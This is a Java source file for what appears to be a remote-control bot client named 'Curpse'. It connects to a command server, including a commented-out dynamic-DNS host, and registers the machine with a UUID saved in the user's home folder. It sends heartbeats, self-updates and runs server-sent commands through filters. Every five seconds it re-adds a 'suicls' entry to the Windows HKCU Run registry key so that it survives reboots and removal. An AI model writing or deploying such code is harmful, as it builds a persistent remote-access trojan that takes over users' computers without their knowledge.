package com.lzy.sui.curpse;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.Socket;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import com.lzy.sui.common.abs.Filter;
import com.lzy.sui.common.model.ProtocolEntity;
import com.lzy.sui.common.utils.MillisecondClock;
import com.lzy.sui.common.utils.SocketUtils;
import com.lzy.sui.curpse.filter.CommonRequestFilter;
import com.lzy.sui.curpse.filter.HeartbeatFilter;
import com.lzy.sui.curpse.filter.ResponseFilter;
import com.lzy.sui.curpse.update.Update;
import com.sun.org.apache.xml.internal.security.utils.Base64;

public class Curpse {

	// 之后添加factory，要能在主线程捕获其他线程中的异常
	private ExecutorService cachedThreadPool = Executors.newFixedThreadPool(10, runnable -> {
		Thread thread = new Thread(runnable);
		thread.setDaemon(true);
		return thread;
	});

	final private String sysPath = System.getProperty("user.home");
	
	final private MillisecondClock clock = new MillisecondClock(cachedThreadPool);

	private Filter headFilter = null;

	private int delayTime = 100;

	private long headTime = 15000;

	private long lastTime = clock.now();

	private String sysUserName = System.getProperty("user.name");

	private Socket socket;

	private static volatile Curpse Curpse;

	private Curpse() {
	}

	public static Curpse newInstance() {
		if (Curpse == null) {
			synchronized (Curpse.class) {
				if (Curpse == null) {
					Curpse = new Curpse();
				}
			}
		}
		return Curpse;
	}

	public void start() {
		init();
		System.out.println("启动服务...");
		while(true){
			try {
				// 1.连接服务器请求登陆
				socket = new Socket("127.0.0.1", 8080);
//				socket = new Socket("192.168.0.110", 12345);
//				socket = new Socket("crazydota.51vip.biz", 16106);
				// 2.登陆
				login();
				// 3.登陆成功后发送心跳包（之后可以改成定时器的第三方类，看情况）
				heartBeat(socket);
				// 4.检查更新
				Update.checkAndUpdate();
				// 5.开启注册表监听
				listenRegedit();
				// 6.开启服务监听
				while (true) {
					ProtocolEntity entity = SocketUtils.receive(socket);
					headFilter.handle(entity);
				}
			} catch (ConnectException e) {
				System.out.println("连接失败：" + e.getMessage());
			} catch (Exception e) {
				e.printStackTrace();
				try {
					if (socket != null) {
						socket.close();
					}
				} catch (Exception e1) {
					e1.printStackTrace();
					System.out.println("关闭socket失败");
				}
			}
			
			//睡眠报错直接重连
			try {
				Thread.sleep(5000);
				System.out.println("尝试重连服务器...");
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		

	}

	public void exit() {
		try {
			if (socket == null) {
				return;
			}
			ProtocolEntity entity = new ProtocolEntity();
			entity.setType(ProtocolEntity.Type.EXIT);
			SocketUtils.send(socket, entity);
			socket.close();
		} catch (IOException e) {
			e.printStackTrace();
			System.out.println("客户端退出异常：" + e.getMessage());
		}
	}

	// 初始化
	public void init() {
		System.out.println("初始化服务...");
		// 1.注册filter
		register();
	}

	private void register() {
		
		try {
			String str=this.getClass().getResource("").toURI().toString();
			if(str.startsWith("file")){
				registerByFile();
			}else if(str.startsWith("jar")){
				registerByJar();
			}
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("注册业务异常" + e.getMessage());
		}

	}

	//开发环境
	public void registerByFile(){
		if (headFilter != null) {
			return;
		}
		try {
			String scanPath = this.getClass().getResource("").toURI().getPath() + "filter";
			Filter filter = null;
			String packName = this.getClass().getPackage().getName() + ".filter.";
			File file = new File(scanPath);
			for (File f : file.listFiles()) {
				String fileName = f.getName();
				String packageClassName = packName + fileName.substring(0, fileName.indexOf("."));
				Filter newFilter = (Filter) Class.forName(packageClassName).newInstance();
				if (headFilter == null) {
					filter = newFilter;
					headFilter = filter;
				} else {
					filter.register(newFilter);
					filter = newFilter;
				}
				System.out.println("注册服务：" + newFilter.getClass().getName());
			}
		} catch (Exception e) {
			e.printStackTrace();
			System.out.println("注册业务异常" + e.getMessage());
		}
	}
	
	//可运行jar包环境（暂时没找到jar包的遍历，先手动注册，之后再弄）
	public void registerByJar(){
		if (headFilter != null) {
			return;
		}
		Filter filter=new CommonRequestFilter();
		headFilter=filter;
		filter.register(new HeartbeatFilter());
		filter=filter.filter;
		filter.register(new ResponseFilter());
	}
	
	private void login() throws IOException {
		String path = System.getProperty("user.home") + File.separator + "suiIdentity.pro";
		File conFile = new File(path);
		String identityId = null;
		if (!conFile.exists()) {
			BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(conFile)));
			identityId = UUID.randomUUID().toString();
			bw.write(identityId);
			bw.newLine();
			bw.flush();
			bw.close();
		} else {
			BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(conFile)));
			identityId = br.readLine();
			br.close();
		}
		if (identityId == null) {
			// 抛异常
			throw new RuntimeException("获取用户Id异常");
		}
		ProtocolEntity entity = new ProtocolEntity();
		entity.setIdentity(ProtocolEntity.Identity.CORPSE);
		entity.setSysUserName(System.getProperty("user.name"));
		entity.setIdentityId(identityId);
		SocketUtils.send(socket, entity);
		// 获取登陆信息
		entity = SocketUtils.receive(socket);
		if (ProtocolEntity.ReplyState.ERROR.equals(entity.getReplyState())) {
			throw new RuntimeException(entity.getReply());
		}
	}

	private void heartBeat(Socket socket) {
		System.out.println("开启心跳");
		cachedThreadPool.execute(() -> {
			try {
				while (true) {
					long currentTime = clock.now();
					if ((currentTime - lastTime) < headTime) {
						Thread.sleep(delayTime);
						continue;
					}
					ProtocolEntity heartBeatEntity = new ProtocolEntity();
					heartBeatEntity.setType(ProtocolEntity.Type.HEARTBEAT);
					heartBeatEntity.setIdentity(ProtocolEntity.Identity.USER);
					heartBeatEntity.setSysUserName(sysUserName);
					SocketUtils.send(socket, heartBeatEntity);
					lastTime = currentTime;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		});
	}
	
	private void listenRegedit(){
		System.out.println("开启注册表监听");
		cachedThreadPool.execute(() -> {
			while(true){
				try{
					String[] str=new String[5];
					str[0]="reg";
					str[1]="query";
					str[2]="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
					str[3]="/v";
					str[4]="suicls";
					
					Process pro =Runtime.getRuntime().exec(str);
					pro.waitFor();
					BufferedReader br=new BufferedReader(new InputStreamReader(pro.getInputStream()));//数据量不大，不需要开线程读缓存
					String v=br.readLine();
					if(v==null||v.isEmpty()){
						String value = sysPath + File.separator + "suicls" + File.separator + "123.bat";
						value = "\\\"" + value + "\\\"";
						str=new String[10];
						str[0]="reg";
						str[1]="add";
						str[2]="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
						str[3]="/v";
						str[4]="suicls";
						str[5]="/t";
						str[6]="REG_SZ";
						str[7]="/d";
						str[8]=value;
						str[9]="/f";
						
						pro =Runtime.getRuntime().exec(str);
						pro.waitFor();
					}
					
					Thread.sleep(5000);
					
				}catch(Exception e){
					e.printStackTrace();
				}
			}
		});
	}

	public Socket getSocket() {
		return socket;
	}

	public void setSocket(Socket socket) {
		this.socket = socket;
	}

	public Filter getHeadFilter() {
		return headFilter;
	}

	public void setHeadFilter(Filter headFilter) {
		this.headFilter = headFilter;
	}

	public ExecutorService getCachedThreadPool() {
		return cachedThreadPool;
	}

	public void setCachedThreadPool(ExecutorService cachedThreadPool) {
		this.cachedThreadPool = cachedThreadPool;
	}

}
